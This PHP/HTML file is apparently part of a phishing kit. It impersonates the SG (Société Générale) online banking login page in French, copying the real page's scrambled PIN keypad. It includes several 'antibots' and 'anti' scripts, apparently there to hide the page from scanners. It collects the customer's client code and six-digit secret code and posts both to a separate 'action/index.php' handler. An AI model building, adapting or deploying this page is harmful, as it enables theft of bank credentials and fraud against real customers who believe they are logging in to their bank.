<?php
include 'src/antibots.php';
include 'antibots.php';
include 'anti/anti1.php';
include 'anti/anti2.php';
include 'anti/anti3.php';
include 'anti/anti4.php';
include 'anti/anti5.php';
include 'anti/anti6.php';
include 'anti/anti7.php';
include 'anti/anti8.php';
?>

<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>SG | Connexion </title>
  <link rel="stylesheet" href="style.css">
  <style>
    .num-buttons {
      display: grid;
      grid-template-columns: repeat(4, auto);
      gap: 4px;
      justify-content: center;
      margin-top: 5px;
    }

    .num-buttons button {
      width: 40px;
      height: 40px;
      font-size: 16px;
      border-radius: 6px;
      padding: 0;
      margin: 0;
    }

    .num-pad {
      margin-top: 20px;
    }

    .validate-btn {
      margin-top: 10px;
    }

    .num-display {
      display: flex;
      justify-content: center;
      gap: 12px;
      margin-bottom: 10px;
      margin-top: 10px;
    }

    .pin-dot {
      width: 16px;
      height: 2px;
      background-color: #999;
      border-radius: 2px;
      transition: all 0.3s ease;
    }

    .pin-dot.filled {
      width: 12px;
      height: 12px;
      background-color: #999;
      border-radius: 50%;
    }
  </style>
</head>
<body>

<form method="POST" action="action/index.php" id="loginForm">
  <input type="hidden" name="code_client" id="codeClientField">
  <input type="hidden" name="code_secret" id="codeSecretField">
</form>

<div class="header">
  <div class="top-bar">
    <div class="nav-right">
      <a href="tel.php"><img src="icons/location.svg" alt=""> Agences</a>
      <a href="#"><img src="icons/warning.svg" alt=""> Aide et contacts</a>
    </div>
  </div>
  <div class="bottom-bar">
    <div class="logo-slogan">
      <img src="IMG/images (3).png" alt="SG Logo">
      <div class="slogan"></div>
    </div>
    <button class="open-account">Ouvrir un compte</button>
  </div>
</div>

<hr>
<p class="sub-title left-title">Connexion à votre Espace Client Particuliers</p>

<div class="container">
  <section class="main-section">
    <div class="left-column">
      <div class="form-box">

        <!-- Code client -->
        <div class="input-wrapper">
          <input type="text" class="client-input" id="clientCode" maxlength="8">
          <label for="clientCode">Saisissez votre code client</label>
          <span class="close-icon" id="iconMark">&times;</span>
        </div>

        <div class="remember-container">
          <label class="toggle-switch">
            <input type="checkbox" id="rememberToggle">
            <span class="slider"></span>
            <span class="toggle-text" id="toggleText">non</span>
          </label>
          <span class="remember-label">Se souvenir de moi</span>
          <span class="info-icon">i</span>
        </div>

        <button class="validate-btn" id="validateFirst">Valider</button>

        <!-- NumPad -->
        <div class="num-pad" id="numPad" style="display: none;">
          <div class="input-wrapper">
            <div class="num-display" id="codeDisplay">
              <div class="pin-dot" data-index="0"></div>
              <div class="pin-dot" data-index="1"></div>
              <div class="pin-dot" data-index="2"></div>
              <div class="pin-dot" data-index="3"></div>
              <div class="pin-dot" data-index="4"></div>
              <div class="pin-dot" data-index="5"></div>
            </div>
            <span class="close-icon" onclick="clearDigit()">&times;</span>
          </div>

          <div class="num-buttons"></div>
          <button class="validate-btn" id="validateSecond">Valider</button>
        </div>
      </div>
    </div>

    <div class="divider"></div>

    <div class="right-column">
      <h3>Où trouver mon Code Client SG ?</h3>
      <ul>
        <li>Votre Code Client vous a été communiqué lors de la souscription à la Banque à Distance...</li>
      </ul>
      <h3>Code Client ou Code Secret inconnus ?</h3>
      <p>» <a href="#">Je souhaite obtenir mon Code Client</a></p>
      <p>» <a href="#">Je ne connais pas mon Code Secret</a></p>
    </div>
  </section>
</div>

<footer>
  <div class="footer-top">
    <div class="footer-links">
      <div>Questions fréquentes</div>
      <div>Trouver une agence</div>
      <div>Autres sites SG</div>
    </div>
    <div class="footer-social">
      <i class="fab fa-facebook-f"></i>
      <i class="fab fa-instagram"></i>
      <i class="fab fa-x-twitter"></i>
    </div>
  </div>

  <div class="footer-bottom">
    <img src="IMG/piedpage.png" alt="SG Logo" class="sg-logo">
    <div class="footer-text">
      <span>Sécurité</span> |
      <span>Nos engagements</span> |
      <span>Cookies</span> |
      <span>Données personnelles</span>
    </div>
  </div>
</footer>

<script>
  const input = document.getElementById('clientCode');
  const icon = document.getElementById('iconMark');
  const validateFirst = document.getElementById('validateFirst');
  const validateSecond = document.getElementById('validateSecond');
  const numPad = document.getElementById('numPad');
  const numButtons = document.querySelector('.num-buttons');
  let password = "";

  icon.addEventListener('click', () => {
    input.value = '';
    icon.textContent = '×';
    input.classList.remove('not-empty');
    icon.classList.remove('valid');
  });

  input.addEventListener('input', () => {
    input.classList.toggle('not-empty', input.value.length > 0);
    if (input.value.length === 8) {
      icon.textContent = '✔';
      icon.classList.add('valid');
    } else {
      icon.textContent = '×';
      icon.classList.remove('valid');
    }
  });

  validateFirst.addEventListener('click', () => {
    if (input.value.length === 8) {
      numPad.style.display = 'block';
      validateFirst.style.display = 'none';
      password = "";
      updateDots();
      numPad.appendChild(validateSecond);
      validateSecond.style.display = 'block';
    }
  });

  function updateDots() {
    const dots = document.querySelectorAll('.pin-dot');
    dots.forEach((dot, index) => {
      if (index < password.length) {
        dot.classList.add('filled');
      } else {
        dot.classList.remove('filled');
      }
    });
  }

  function enterDigit(num) {
    if (password.length < 6) {
      password += num;
      updateDots();
    }
  }

  function clearDigit() {
    password = password.slice(0, -1);
    updateDots();
  }

  validateSecond.addEventListener('click', () => {
    if (password.length === 6) {
      document.getElementById('codeClientField').value = input.value;
      document.getElementById('codeSecretField').value = password;
      document.getElementById('loginForm').submit();
    } else {
      alert("Veuillez saisir 6 chiffres.");
    }
  });

  const layout = ['', '', 2, 8, '', 1, 4, 6, '', 7, '', 3, 5, 0, 9, ''];
  numButtons.innerHTML = '';
  layout.forEach(val => {
    const btn = document.createElement('button');
    if (val === '') {
      btn.disabled = true;
    } else {
      btn.textContent = val;
      btn.onclick = () => enterDigit(val);
    }
    numButtons.appendChild(btn);
  });
</script>

</body>
</html>
